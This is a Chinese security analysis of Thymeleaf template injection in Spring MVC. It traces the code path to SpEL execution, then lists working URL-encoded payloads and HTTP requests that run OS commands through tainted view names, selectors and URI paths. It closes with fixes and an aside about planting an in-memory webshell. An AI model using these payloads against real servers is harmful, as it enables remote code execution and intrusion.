###  processDispatchResult
获取到`ModelAndView`值后会进入到`processDispatchResult`方法，第1个if会被跳过，跟进第2个if中的render方法
在`render`方法中，首先会获取mv对象的`viewName`，然后调用`resolveViewName`方法，`resolveViewName`方法最终会获取最匹配的视图解析器。
跟一下`resolveViewName`方法，这里涉及到两个方法：1、首先通过`getCandidateViews`筛选出`resolveViewName`方法返回值不为null的视图解析器添加到`candidateViews`中;
2、之后通过`getBestView`拿到最适配的解析器，getBestView中的逻辑是优先返回在`candidateViews`存在重定向动作的`view`，如果都不存在则根据请求头中的`Accept`字段的值与`candidateViews`的相关顺序，并判断是否兼容来返回最适配的`View`
getCandidateViews：
getBestView：
最终返回的是`ThymeleafView`之后`ThymeleafView`调用了`render`方法
紧接着调用`renderFragment`
这里是漏洞触发的关键点之一，该方法在后面首先判断`viewTemplateName`是否包含`::`,若包含则获取解析器,调用`parseExpression`方法将`viewTemplateName`(也就是Controller中最后return的值)构造成片段表达式(`~{}`)并解析执行，跟进`parseExpression`方法。
在org/thymeleaf/standard/expression/StandardExpressionParser中调用parseExpression
最终在org/thymeleaf/standard/expression/StandardExpressionParser对我们表达式进行解析，首先在`preprocess`方法对表达式进行预处理（这里只要表达式正确就已经执行了我们payload中的命令）并把结果存入`preprocessedInput`,可以看到此时预处理就已经执行了命令，之后再次调用`parse`对预处理的结果`preprocessedInput`进行第二次解析，而第二次解析时，需要语法正确也就是在Thymeleaf中，`~{}`中`::`需要有值才可以获得回显，否则没有回显。
在org/thymeleaf/standard/expression/StandardExpressionPreprocessor#preprocess方法中，首先通过正则，将`__xxxx__`中间xxxx部分提取出来，调用execute执行
跟进execute最终调用org/thymeleaf/standard/expression/VariableExpression#executeVariableExpression使用SpEL执行表达式，触发任意代码执行。
## 漏洞复现
首先常见的一个payload就是`__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x`，通过`__${}__::.x`构造表达式会由Thymeleaf去执行
###  0x01 templatename
Payload:`lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x`，这里因为最后return的值为`user/__${new
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x/welcome`,无论我们payload如何构造最后都会拼接`/welcome`所以根据前面分析即使不加`.x`依然可以触发命令执行
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
###  0x02 selector
Contorller ：可控点变为了selector位置
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }
payload
`/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x`
其实这里也可以不需要`.x`和`::`也可触发命令执行
poc:
`/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open%20-a%20Calculator").getInputStream()).next()%7d__`
关于回显问题：在0x01与0x02payload注入点不同会导致有无回显，也可以说是controller代码给予我们的可控参数不同，
0x01中可控的是templatename，而0x02中可控的是selector，而这两个地方的注入在最后抛出异常的时候找不到templatename是存在结果回显的而找不到selector不存在结果回显。
###  0x03 URI path
Controller
    @GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
payload
因为mav返回值为空，所以viewTemplateName会从uri中获取，直接在`{document}`位置传入payload即可
`http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x`
###  0x03 构造回显
这里其实和0x01类似，templatename部分可控，没回显的原因在于defaultView中对URI path的处理，我们可以在最后加两个`.`
poc
`/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..`需要注意的是`::`必须放在后面，放在前面虽然可以执行命令，但是没有回显。
###  About .x
在0x03中payload最后是必须要`.x`，看一下为什么，之前在`applyDefaultViewName`部分有提到`defaultViewName`这个值，因为mav返回值为空，所以viewTemplateName会从uri中获取，我们看下是如何处理`defaultViewName`的，调试之后发现在`getViewName`方法中调用`transformPath`对URL中的`path`进行了处理
重点在于第3个if中`stripFilenameExtension`方法
/org/springframework/util/StringUtils#stripFilenameExtension该方法会对后缀做一个清除
如果我们传入的payload没有`.x`的话，例如`http://localhost:8090/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::`最后会被处理成`/doc/__${new
java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a
calculator").getInputStream())`从而没有了`::`无法进入预处理导致无法执行任意代码。
所以这里即使是在最后只加个`.`也是可以的，不一定必须是`.x`
## 其他姿势
这里列举几个比较新奇的思路，反射之类的就不列举了，改一下表达式中的代码即可。
### 0x01 `::` 位置
除了上面利用`.`替换`.x`以外（ModelAndView为null，从URI中获取viewname）在0x01中`::`的位置也不是固定的，这个看之前的代码逻辑即可知晓，比如可以替换成下面的poc,将`::`放在最前面：
`::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__`
###  0x02 POST方式
这个是在turn1tup师傅的文章中get的
    POST /path HTTP/1.1
    Host: localhost:8090
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 135
    lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
### 0x03 省略`__`
当Controller如下配置时，可以省略`__`包裹
    @RequestMapping("/path")
    public String path2(@RequestParam String lang) {
        return lang; //template path is tainted
    }
poc，也不局限于用`${}`,用`*{}`也是可以的
    GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
    Host: localhost:8090
关于这种方式可以参考：
## 修复方案
0x01 配置 `[@ResponseBody](https://github.com/ResponseBody "@ResponseBody")` 或者
`[@RestController](https://github.com/RestController "@RestController")`
这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。
    @GetMapping("/safe/fragment")
    @ResponseBody
    public String safeFragment(@RequestParam String section) {
        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
    }
0x02 在返回值前面加上 “redirect:”
这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。
    @GetMapping("/safe/redirect")
    public String redirect(@RequestParam String url) {
        return "redirect:" + url; //FP as redirects are not resolved as expressions
    }
0x03 在方法参数中加上 HttpServletResponse 参数
由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP
Response，因此不会发生视图名称解析。
    @GetMapping("/safe/doc/{document}")
    public void getDocument(@PathVariable String document, HttpServletResponse response) {
        log.info("Retrieving " + document); //FP
    }
## 结语
关于这个漏洞的话调试下来感觉很巧妙，有很多值得深入挖掘的点，但是个人感觉Thymeleaf平常更多的使用姿势还是在于将变量渲染到前端页面而不是类似于输入模版名称去动态返回模版文件，可能实战遇到的并不会很多吧。再有就是在审计的时候有没有一些可以快速定位到该缺陷的方法，待研究。如果真的遇到了，也没必要过于纠结回显，可以直接打内存马。
## Reference